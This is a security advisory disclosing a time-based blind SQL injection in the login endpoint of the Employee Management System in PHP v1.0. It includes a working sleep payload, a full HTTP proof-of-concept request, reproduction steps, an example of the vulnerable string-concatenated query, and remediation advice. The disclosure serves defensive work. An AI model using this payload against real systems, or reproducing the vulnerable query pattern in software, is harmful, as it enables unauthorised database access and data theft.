## SQL Injection in Employee Management System PHP mailuid Parameter
## Credit

Discovered by: Ahmad Marzouk

## Product

Employee Management System in PHP

## Vendor

Code-Projects

## Vendor Homepage

https://code-projects.org/employee-management-system-in-php-with-source-code/

## Affected Version

Employee Management System v1.0

## Vulnerability Type

SQL Injection

CWE

CWE-89 – Improper Neutralization of Special Elements used in an SQL Command (SQL Injection)

## Severity

Critical

CVSS v3.1 Score

9.8 (Critical)

Vector:

CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
## Description

The Employee Management System in PHP v1.0 is vulnerable to a SQL Injection vulnerability in the authentication functionality.

The vulnerability exists in the following endpoint:

/370project/process/eprocess.php

The application processes login requests using the mailuid and pwd parameters supplied via an HTTP POST request. The mailuid parameter is directly incorporated into backend SQL queries without proper validation, sanitization, or parameterized query handling.

Because the application fails to neutralize special SQL characters, attackers can inject malicious SQL code into the login request. This allows manipulation of the SQL query structure and execution of arbitrary SQL commands.

During testing, a time-based SQL injection payload was successfully executed:

'+(select*from(select(sleep(20)))a)+'

When this payload is submitted, the server response is delayed by approximately 20 seconds, confirming that the injected SQL query is executed by the database.

This demonstrates a time-based blind SQL injection vulnerability in the authentication mechanism.

## Root Cause

The vulnerability is caused by improper handling of user-controlled input in SQL queries.

Specifically:

Direct concatenation of user input into SQL queries
Lack of input validation and sanitization
Absence of prepared statements or parameterized queries
Insecure handling of authentication logic

A typical vulnerable implementation:

$mailuid = $_POST['mailuid'];
$pwd = $_POST['pwd'];

$query = "SELECT * FROM employees WHERE email='$mailuid' AND password='$pwd'";

Because the input is not sanitized, attackers can inject SQL payloads to manipulate the query.

## Affected Endpoint
/370project/process/eprocess.php
## Vulnerable Parameter
mailuid
## HTTP Method
POST
## Proof of Concept
Full HTTP Request
 ```plain
POST /370project/process/eprocess.php HTTP/1.1
Host: localhost
Cache-Control: max-age=0
Sec-CH-UA: "Google Chrome";v="145", "Not=A?Brand";v="8", "Chromium";v="145"
Sec-CH-UA-Mobile: ?0
Sec-CH-UA-Platform: "macOS"
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Connection: close
Origin: https://localhost
Upgrade-Insecure-Requests: 1
Referer: https://localhost/370project/elogin.html
Content-Type: application/x-www-form-urlencoded
Content-Length: 43

mailuid=176737'%2b(select*from(select(sleep(20)))a)%2b'&pwd=admin&login-submit=Login
 ```
## Steps to Reproduce
Install the Employee Management System in PHP.
Navigate to the login page.
Intercept the login request using a proxy tool (e.g., Burp Suite).
Modify the mailuid parameter:
'+(select*from(select(sleep(20)))a)+'
Send the request.
Result

The server response is delayed by approximately 20 seconds, confirming execution of the injected SQL payload.

## Impact

Successful exploitation allows attackers to:

Bypass authentication mechanisms
Execute arbitrary SQL queries
Extract sensitive database information
Access user accounts
Modify or delete database records
Escalate privileges
Fully compromise the application database

Because this vulnerability affects the authentication mechanism and requires no authentication, it is considered critical.

Vulnerability Classification
CWE

CWE-89 – SQL Injection

OWASP Top 10

A03:2021 – Injection

Suggested Remediation
Use Prepared Statements
$stmt = $conn->prepare("SELECT * FROM employees WHERE email = ? AND password = ?");
$stmt->execute([$mailuid, $pwd]);
Input Validation

Validate and sanitize all user input.

Password Security

Use hashed passwords instead of plaintext.

Least Privilege

Limit database user permissions.

Security Testing

Perform regular security audits and penetration testing.

## PoC

<img width="967" height="646" alt="Image" src="https://github.com/user-attachments/assets/69449075-fc53-483e-b232-acb48a852a78" />
